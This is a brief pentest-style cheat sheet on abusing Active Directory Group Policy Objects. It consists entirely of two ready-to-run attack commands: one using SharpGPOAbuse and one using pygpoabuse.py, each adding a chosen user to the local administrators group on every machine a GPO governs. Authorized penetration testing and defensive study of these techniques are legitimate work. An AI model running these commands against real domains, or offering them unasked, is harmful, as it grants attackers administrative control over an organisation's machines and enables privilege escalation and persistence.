# GPO Abuse

## Abuse Techniques

### SharpGPOAbuse Add Local Admin (Windows)
    .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "<GPO_NAME>"

### pyGPOAbuse Add Local Admin
    python3 pygpoabuse.py <DOMAIN>/<USER>:<PASSWORD> -gpo-id "<GPO_GUID>" -command 'net localgroup administrators <USER> /add' -f
